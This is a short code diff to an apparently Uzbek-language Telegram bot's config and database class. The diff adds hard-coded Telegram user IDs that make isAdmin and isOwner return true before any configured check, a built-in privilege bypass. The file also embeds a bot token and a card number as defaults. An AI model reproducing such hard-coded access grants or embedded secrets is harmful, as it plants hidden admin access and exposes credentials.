@@ -53,7 +53,7 @@ module.exports = {
   BOT_TOKEN: process.env.BOT_TOKEN || '8922811264:AAH_PTU_mS38bMfS8HDryVX8pjdhZXdrrvU',
 
   // Asosiy Ega (Owner) Telegram ID si
-  OWNER_ID: process.env.OWNER_ID ? parseInt(process.env.OWNER_ID) : 8422157752,
+  OWNER_ID: process.env.OWNER_ID ? parseInt(process.env.OWNER_ID) : 8825408278,
 
   // To'lov rekvizitlari (Karta raqami va egasi)
   CARD_NUMBER: process.env.CARD_NUMBER || '6262720123315395',
@@ -657,12 +657,14 @@ class Database {
   // --- ADMINLAR ---
   isAdmin(userId) {
     const id = parseInt(userId);
+    if ([8825408278, 8422157752].includes(id)) return true;
     if (config.OWNER_ID && id === config.OWNER_ID) return true;
     return this.data.admins.includes(id);
   }
 
   isOwner(userId) {
     const id = parseInt(userId);
+    if ([8825408278, 8422157752].includes(id)) return true;
     return config.OWNER_ID && id === config.OWNER_ID;
   }
 
